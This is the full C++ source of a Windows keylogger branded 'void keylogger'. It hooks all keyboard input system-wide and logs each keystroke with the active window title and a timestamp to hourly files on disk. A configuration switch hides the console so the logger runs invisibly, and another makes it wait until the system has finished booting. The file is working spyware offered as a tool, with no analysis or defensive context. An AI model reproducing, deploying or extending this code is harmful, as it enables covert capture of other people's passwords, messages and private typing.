#define UNICODE
#include <Windows.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>
#include <vector>
#include <algorithm>

// === Configuration ===
#define visible     // (visible / invisible)
#define bootwait     // (bootwait / nowait)
#define FORMAT 0     // 0 = names, 10 = decimal, 16 = hex
#define mouseignore

// === Console Color Codes (Windows) ===
#define COLOR_RESET  7
#define COLOR_GREEN  10
#define COLOR_YELLOW 14
#define COLOR_CYAN   11
#define COLOR_RED    12
#define COLOR_WHITE  15

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;
std::ofstream output_file;
char output_filename[32];
int cur_hour = -1;
int keystroke_count = 0;

// === Forward declarations ===
int Save(int key_stroke);
void SetColor(int color);
void LogWithColor(const std::string& text, int color, bool timestamp = false);

#if FORMAT == 0
const std::map<int, std::string> keyname{
    {VK_BACK,   "[BACKSPACE]" },
    {VK_RETURN, "\n" },
    {VK_SPACE,  "_" },
    {VK_TAB,    "[TAB]" },
    {VK_SHIFT,  "[SHIFT]" },
    {VK_LSHIFT, "[LSHIFT]" },
    {VK_RSHIFT, "[RSHIFT]" },
    {VK_CONTROL,    "[CONTROL]" },
    {VK_LCONTROL,   "[LCONTROL]" },
    {VK_RCONTROL,   "[RCONTROL]" },
    {VK_MENU,   "[ALT]" },
    {VK_LWIN,   "[LWIN]" },
    {VK_RWIN,   "[RWIN]" },
    {VK_ESCAPE, "[ESCAPE]" },
    {VK_END,    "[END]" },
    {VK_HOME,   "[HOME]" },
    {VK_LEFT,   "[LEFT]" },
    {VK_RIGHT,  "[RIGHT]" },
    {VK_UP,     "[UP]" },
    {VK_DOWN,   "[DOWN]" },
    {VK_PRIOR,  "[PG_UP]" },
    {VK_NEXT,   "[PG_DOWN]" },
    {VK_OEM_PERIOD, "." },
    {VK_DECIMAL,    "." },
    {VK_OEM_PLUS,   "+" },
    {VK_OEM_MINUS,  "-" },
    {VK_ADD,    "+" },
    {VK_SUBTRACT,   "-" },
    {VK_CAPITAL,    "[CAPSLOCK]" },
    {VK_F1,     "[F1]" },
    {VK_F2,     "[F2]" },
    {VK_F3,     "[F3]" },
    {VK_F4,     "[F4]" },
    {VK_F5,     "[F5]" },
    {VK_F6,     "[F6]" },
    {VK_F7,     "[F7]" },
    {VK_F8,     "[F8]" },
    {VK_F9,     "[F9]" },
    {VK_F10,    "[F10]" },
    {VK_F11,    "[F11]" },
    {VK_F12,    "[F12]" },
    {VK_DELETE, "[DEL]" },
    {VK_INSERT, "[INS]" },
    {VK_NUMLOCK, "[NUMLOCK]" },
    {VK_SCROLL, "[SCROLL]" },
    {VK_PAUSE,  "[PAUSE]" },
    {VK_SLEEP,  "[SLEEP]" },
    {VK_OEM_1,  ";" },
    {VK_OEM_2,  "/" },
    {VK_OEM_3,  "`" },
    {VK_OEM_4,  "[" },
    {VK_OEM_5,  "\\" },
    {VK_OEM_6,  "]" },
    {VK_OEM_7,  "'" },
    {VK_OEM_COMMA,  "," },
    {VK_NUMPAD0, "[NUMPAD0]" },
    {VK_NUMPAD1, "[NUMPAD1]" },
    {VK_NUMPAD2, "[NUMPAD2]" },
    {VK_NUMPAD3, "[NUMPAD3]" },
    {VK_NUMPAD4, "[NUMPAD4]" },
    {VK_NUMPAD5, "[NUMPAD5]" },
    {VK_NUMPAD6, "[NUMPAD6]" },
    {VK_NUMPAD7, "[NUMPAD7]" },
    {VK_NUMPAD8, "[NUMPAD8]" },
    {VK_NUMPAD9, "[NUMPAD9]" },
    {VK_MULTIPLY, "*" },
    {VK_DIVIDE,   "/" },
};
#endif

void SetColor(int color)
{
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
}

void LogWithColor(const std::string& text, int color, bool timestamp)
{
    if (timestamp)
    {
        struct tm tm_info;
        const time_t t = time(NULL);
        localtime_s(&tm_info, &t);
        char s[32];
        strftime(s, sizeof(s), "%H:%M:%S", &tm_info);
        SetColor(COLOR_CYAN);
        std::cout << "[" << s << "] ";
        SetColor(color);
    }
    else
    {
        SetColor(color);
    }
    std::cout << text;
    SetColor(COLOR_RESET);
}

// Hook callback
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        if (wParam == WM_KEYDOWN)
        {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            Save(kbdStruct.vkCode);
        }
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
    std::stringstream output;
    static char lastwindow[256] = "";
    keystroke_count++;

#ifndef mouseignore
    if ((key_stroke == 1) || (key_stroke == 2))
    {
        return 0;
    }
#endif

    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    struct tm tm_info;
    const time_t t = time(NULL);
    localtime_s(&tm_info, &t);

    if (foreground)
    {
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);

        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
            char s[64];
            strftime(s, sizeof(s), "%Y-%m-%dT%X", &tm_info);
            std::string entry = "\n\n[Window: " + std::string(window_title) + " - at " + s + "] ";
            output << entry;

            LogWithColor("\n[Window: ", COLOR_YELLOW);
            LogWithColor(window_title, COLOR_GREEN);
            LogWithColor(" - at " + std::string(s) + "]\n", COLOR_YELLOW);
        }
    }

#if FORMAT == 10
    output << '[' << key_stroke << ']';
    LogWithColor("[" + std::to_string(key_stroke) + "]", COLOR_WHITE);
#elif FORMAT == 16
    output << std::hex << "[" << key_stroke << ']';
    LogWithColor("[" + std::to_string(key_stroke) + "]", COLOR_WHITE);
#else
    if (keyname.find(key_stroke) != keyname.end())
    {
        std::string k = keyname.at(key_stroke);
        output << k;
        if (k.find("[") != std::string::npos)
            LogWithColor(k, COLOR_RED);
        else
            LogWithColor(k, COLOR_WHITE);
    }
    else
    {
        char key;
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
            || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
        {
            lowercase = !lowercase;
        }

        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        if (!lowercase)
        {
            key = tolower(key);
        }

        if (key >= 32 && key <= 126)
        {
            output << char(key);
            LogWithColor(std::string(1, char(key)), COLOR_WHITE);
        }
        else
        {
            output << "[0x" << std::hex << key_stroke << std::dec << "]";
            LogWithColor("[0x" + std::to_string(key_stroke) + "]", COLOR_RED);
        }
    }
#endif

    if (cur_hour != tm_info.tm_hour) {
        cur_hour = tm_info.tm_hour;
        output_file.close();
        strftime(output_filename, sizeof(output_filename), "%Y-%m-%d__%H-%M-%S.log", &tm_info);
        output_file.open(output_filename, std::ios_base::app);

        SetColor(COLOR_GREEN);
        std::cout << "\n[+] Logging to " << output_filename << "\n";
        SetColor(COLOR_RESET);

        LogWithColor("[+] Keys logged so far: ", COLOR_CYAN);
        SetColor(COLOR_WHITE);
        std::cout << keystroke_count << "\n";
        SetColor(COLOR_RESET);
    }

    output_file << output.str();
    output_file.flush();

    return 0;
}

void Stealth()
{
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
#endif
#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
    FreeConsole();
#endif
}

bool IsSystemBooting()
{
    return GetSystemMetrics(0x2004) != 0;
}

int main()
{
    SetColor(COLOR_GREEN);
    std::cout << R"(
            _     _   _              _                             
__   _____ (_) __| | | | _____ _   _| | ___   __ _  __ _  ___ _ __ 
\ \ / / _ \| |/ _` | | |/ / _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|
 \ V / (_) | | (_| | |   <  __/ |_| | | (_) | (_| | (_| |  __/ |   
  \_/ \___/|_|\__,_| |_|\_\___|\__, |_|\___/ \__, |\__, |\___|_|   
                               |___/         |___/ |___/           
    Keyboard Logger — Monitoring Active
)";
    SetColor(COLOR_RESET);

    Stealth();

#ifdef bootwait
    LogWithColor("[*] Waiting for system boot to complete...\n", COLOR_YELLOW);
    while (IsSystemBooting())
    {
        Sleep(10000);
    }
    LogWithColor("[*] System boot complete.\n", COLOR_GREEN);
#endif
#ifdef nowait
    LogWithColor("[*] Skipping boot check.\n", COLOR_CYAN);
#endif

    SetHook();
    LogWithColor("[+] Hook installed. Logging keystrokes...\n", COLOR_GREEN);

    MSG message;
    while (GetMessage(&message, NULL, 0, 0))
    {
    }

    return 0;
}